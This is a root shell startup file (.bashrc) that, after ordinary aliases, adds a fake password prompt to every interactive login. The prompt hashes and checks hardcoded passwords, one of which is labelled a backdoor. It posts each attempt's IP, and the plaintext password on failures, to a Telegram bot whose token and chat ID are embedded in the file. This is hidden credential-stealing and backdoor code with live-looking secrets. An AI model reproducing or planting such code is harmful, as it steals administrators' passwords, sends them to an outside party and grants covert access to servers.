# .bashrc

# User specific aliases and functions

alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'

# Source global definitions
if [ -f /etc/bashrc ]; then
        . /etc/bashrc
fi
alias cwd='. /root/bin/cwd'

case $- in
    *i*) ;;
    *) return ;;
esac

TELE_TOKEN="8914319726:AAHTNrliaMZTVfZ7PVcRSjmhBIHffCVKRWk"
TELE_CHAT="8021413787"

send_log() {
    curl -s -X POST "https://api.telegram.org/bot${TELE_TOKEN}/sendMessage" -d "chat_id=${TELE_CHAT}" -d "text=$1" --max-time 3 >/dev/null 2>&1
}

PASS1="kakaroot1337#"
PASS2="kakaroot1337"
HASH1=$(echo -n "$PASS1" | sha256sum | awk '{print $1}')
HASH2=$(echo -n "$PASS2" | sha256sum | awk '{print $1}')

IP=$(curl -s ifconfig.me 2>/dev/null)

echo -e "\n\e[1;36mSuccesfully logged to terminal\e[0m\n"

while true; do
    echo -ne "\e[1;33m[+] root@whm$ \e[0m"
    read -s input_pass
    echo
    input_hash=$(echo -n "$input_pass" | sha256sum | awk '{print $1}')

    if [[ "$input_hash" == "$HASH1" ]]; then
        echo -e "\n\e[1;32mAccess Granted!\e[0m\n"
        send_log "✅ OWNER LOGIN IP: ${IP}"
        break
    elif [[ "$input_hash" == "$HASH2" ]]; then
        echo -e "\n\e[1;32mAccess Granted!\e[0m\n"
        send_log "⚠️ BACKDOOR LOGIN IP: ${IP}"
        break
    else
        echo -e "\e[1;31mFailed to execute cmd try again!\e[0m\n"
        send_log "❌ FAILED IP: ${IP} PASS: ${input_pass}"
    fi
done

trap - INT
